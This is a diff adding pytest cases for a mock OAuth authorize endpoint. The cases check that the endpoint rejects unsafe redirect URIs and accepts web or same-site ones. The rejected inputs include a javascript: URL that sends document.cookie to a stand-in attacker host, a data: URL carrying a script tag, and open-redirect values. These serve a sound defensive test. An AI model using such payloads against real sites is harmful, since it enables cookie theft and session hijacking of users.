@@ -118,3 +118,31 @@ def test_mock_stays_refused_outside_development_and_test() -> None:
     for env in ("staging", "production"):
         with pytest.raises(ConfigError):
             _mock_provider("org-x", env)
+
+
+@pytest.mark.parametrize(
+    "redirect_uri",
+    [
+        "javascript:fetch('https://evil.example/?t='+document.cookie)",
+        "JavaScript:alert(1)",
+        "data:text/html,<script>alert(1)</script>",
+        "//evil.example/auth/callback",
+        "evil.example/auth/callback",
+        "https:///no-host",
+    ],
+)
+async def test_mock_authorize_refuses_a_non_web_redirect_uri(redirect_uri: str) -> None:
+    """PR #291 review: html.escape does not stop a `javascript:` URL inside `href`."""
+    async with _client(_mock_app(_mock_provider("idp-none"), object())) as client:
+        res = await client.get("/api/auth/mock/authorize", params={"redirect_uri": redirect_uri})
+    assert res.status_code == 422
+    assert "href=" not in res.text
+
+
+@pytest.mark.parametrize(
+    "redirect_uri", [REDIRECT, "https://app.example.org/auth/callback", "/auth/callback"]
+)
+async def test_mock_authorize_accepts_a_web_or_same_site_redirect_uri(redirect_uri: str) -> None:
+    async with _client(_mock_app(_mock_provider("idp-none"), object())) as client:
+        res = await client.get("/api/auth/mock/authorize", params={"redirect_uri": redirect_uri})
+    assert res.status_code == 200
